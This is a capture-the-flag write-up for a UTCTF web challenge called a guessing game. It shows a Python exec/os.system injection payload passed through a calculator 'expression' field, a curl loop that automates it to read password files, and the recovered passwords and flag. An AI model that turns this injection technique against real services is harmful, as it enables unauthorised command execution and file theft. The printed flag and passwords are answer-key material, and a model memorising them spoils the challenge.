#### Challenge:

Who says guessing games shouldn't let you do math?

http://guppy.utctf.live:5957

By Alex (@Alex_ on discord)

---

#### Solution:

- we solved this challenge by collaborative efforts of other contestant as the container was shared for everyone. All of the mess and attempts were accessible across all teams.
- first 3 passwords `PuXqj7n4WNZzStnWbtPv` `Krdi9yQuY8mHoteZDCF5` `E46Dnqb5enAMgGArbruu` can be easily obtained just via following payload `exec('import os; os.system(\"cat *.txt;\"); print()')`

```bash
for level in 0 1 2; do
    password=$(
        curl -b /tmp/guppy.utctf.live --cookie-jar /tmp/guppy.utctf.live  'http://guppy.utctf.live:5957/' -X POST \
            -H 'Content-Type: application/x-www-form-urlencoded' \
            --data-urlencode 'type=calculate' \
            --data-urlencode "level=${level}" \
            --data-urlencode "expression=exec('import os; os.system(\"cat *.txt;\"); print()')" \
            2>/dev/null | htmlq --text '.result>pre' | head -n 1
    )
    echo -n "$password - "

    curl -b /tmp/guppy.utctf.live --cookie-jar /tmp/guppy.utctf.live  'http://guppy.utctf.live:5957/' -X POST \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        --data-urlencode 'type=unlock' \
        --data-urlencode "password=${password}" 2>/dev/null | htmlq --text '.notification'
done
```

- as for the last password `5F4p7aLgQ5Nfn5YM8s68` during the competition someone unintentionally leaked it to `/tmp`

---

<details><summary>FLAG:</summary>

```
utflag{LGvb7PJXG5JDwhsEW7xp}
```

</details>
<br/>
